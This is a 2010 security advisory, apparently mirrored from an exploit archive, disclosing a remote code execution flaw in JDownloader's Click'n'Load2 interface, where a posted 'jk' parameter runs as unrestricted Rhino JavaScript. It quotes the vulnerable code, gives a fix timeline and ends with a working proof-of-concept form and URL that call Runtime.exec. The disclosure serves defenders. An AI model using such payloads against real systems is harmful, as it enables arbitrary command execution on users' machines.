@@ -1,0 +1,105 @@
+id: 10803
+date: 02/09/2010
+title: JDownloader concept included execution vulnerability
+author: apoc
+cves: 
+
+====================================================
+JDownloader concept included execution vulnerability
+====================================================
+
+- -- Product
+
+JDownloader[1] is an open source download manager for One-Click-
+Filehoster like Rapidshare or Megaupload. The Click'n'Load[2] interface
+allows external applications and websites to send URLs to the local
+running JDownloader. With Click'n'Load2 [3] it is possible to sent
+AES-CBC encrypted URLs (for some kind of link 'obfuscation').
+The encrypted payload _and_ key are sent with an HTTP-POST submit on
+localhost port 9666 (default port, listening on any(0.0.0.0)).
+
+[1] http://jdownloader.org/
+[2] http://jdownloader.org/knowledge/wiki/glossary/click-n-load
+[3] http://jdownloader.org/knowledge/wiki/glossary/cnl2
+
+- -- Vulnerability
+
+The transmitted key can be plaintext or javascript code that is then
+executed by JDownloader with the Mozilla Rhino Javascript
+implementation. Here is the code for this: (plugins/
+JDExternInterface.jar / JDExternInterface.java)
+
+  String jk = Encoding.urlDecode(request.getParameters().get("jk"), false);
+  [...]
+  Context cx = Context.enter();
+  Scriptable scope = cx.initStandardObjects();
+  String fun = jk + "  f()";
+  Object result = cx.evaluateString(scope, fun, "<cmd>", 1, null);
+  key = JDHexUtils.getByteArray(Context.toString(result));
+  Context.exit();
+
+The Default Context that is initialized here, allows the javascript to
+execute without any security restrictions. The javascript can import and
+use any java library resulting in an remote code execution flaw.
+
+After the form data is sent, JDownloader will, depending on transmitted
+_Referer/Source and/or User-Agent_, ask for permission to add Links from
+external Website/Application, the code is executed after the user
+confirms.
+
+- -- Affected Versions
+
+All versions prior 2010-01-25 (with Click'n'Load 2 support) are
+vulnerable. (Release version 0.9.334)
+
+- -- Solutions
+
+Update JDownloader to the newest version with the Autoupdate/Webupdate.
+I recommend to disable the remote interface (FlashGot for Firefox)
+in the "AddOn Manager" configuration.
+
+- -- Timeline
+
+2010-01-25 - Vulnerability reported to vendor
+2010-01-25 - Vendor security fix via autoupdate
+2010-02-08 - Public Disclosure
+
+- -- Proof of Concept
+
+<form action="http://localhost:9666/flash/addcrypted2" method="post">
+<textarea name="jk">
+function f() {
+    var run = java.lang.Runtime.getRuntime();
+    run.exec('/usr/bin/xclock');
+
+    return '42';
+}
+</textarea>
+<input type="hidden" name="passwords" value="invalid" />
+<input type="hidden" name="source" value="http://example.com/invalid" />
+<input type="hidden" name="crypted" value="invalid" />
+<input type="submit" value="CLICK" />
+</form>
+
+or:
+
+http://localhost:9666/flash/addcrypted2?jk=function+f()+%7B+var+run+%3D
++java.lang.Runtime.getRuntime()%3B+run.exec('%2Fusr%2Fbin%2Fxclock')%3B
++return+'42'%3B+%7D&passwords=invalid&source=http://example.com/invalid
+&crypted=invalid
+
+- -- Conclusion
+
+It seems that this is a common misuse of the Rhino JavaScript[1]
+library, that is dangerous whenever arbitrary JavaScript is executed.
+There many other libraries and applications may vulnerable to this kind
+of vulnerability.
+
+[1] http://www.mozilla.org/rhino/
+
+- --
+
+
+
+
+#  0day.today [2023-03-24]  #
